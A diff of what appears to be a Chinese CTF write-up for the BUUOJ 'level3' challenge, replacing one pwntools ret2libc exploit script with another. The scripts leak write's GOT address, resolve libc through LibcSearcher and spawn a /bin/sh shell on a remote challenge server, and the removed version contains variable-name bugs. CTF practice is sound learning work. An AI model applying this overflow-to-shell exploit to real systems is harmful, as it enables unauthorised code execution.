@@ -147,37 +147,33 @@ ssize_t vulnerable_function()
 ```
 
 ```python
-from pwn import*
-from LibcSearcherX import*
-r=remote('node5.buuoj.cn',27144)
-elf=ELF("/home/yuji/桌面/level3")
-write_plt=elf.symbols['write']
-write_got=elf.got['write']
-main=elf.symbols['write']
-payload_adr=flat(b'a'*(0x88+4)+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4))
+from pwn import *
+from LibcSearcher import *
 
-#system_adr=0x04004C0     
-#sh_adr=0x0600A90
-#adr=0x08048480
-#rdi_adr=0x04006b3 
-#payload=b'a'*(0x80+8)+p64(rdi_adr)+p64(sh_adr)+p64(system_adr)
+r=remote('node5.buuoj.cn',26178)
+elf=ELF('./level3')
+
+main=0x804844B
+write_plt=elf.plt['write']
+write_got=elf.got['write']
+
+payload=b'a'*(0x88+4)+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
+
 r.recvuntil('Input:\n')
-r.sendline(payload_adr)
-write_adr=u32(r.recv(4))
-libc=LibcSearcherLocal("write",write_adr)
-libcbase=write_adr-libc.sym['write']
-system=libcbase+libc.sym['system']
-bin_sh=libcbase+libc.sym['str_bin_sh']
-print("[+] Phase 3 Inprogress.")
-print("[+] Real Address: ",hex(write_addr))
-print("[+] Base Address: ",hex(write_addr))
-print("[+] System Address: ",hex(system))
-print("[+] /bin/sh Address: ",hex(bin_sh))
-print("[+] Phase 3 Completed")
-print("--------------------------------------------------")
-payload = (b'A' * ( 0x88 + 0x4 ) + p32(system) + p32(0) + p32(bin_sh) )
 r.sendline(payload)
+write_addr=u32(r.recv(4))
+
+libc=LibcSearcher('write',write_addr)
+libc_base=write_addr-libc.dump('write')
+system=libc_base+libc.dump('system')
+sh=libc_base+libc.dump('str_bin_sh')
+
+payload=b'a'*(0x88+4)+p32(system)+p32(main)+p32(sh)
+r.recvuntil('Input:\n')
+r.sendline(payload)
+
 r.interactive()
+
 ```
 
 ​​ELF​​：加载目标二进制文件，便于获取符号信息
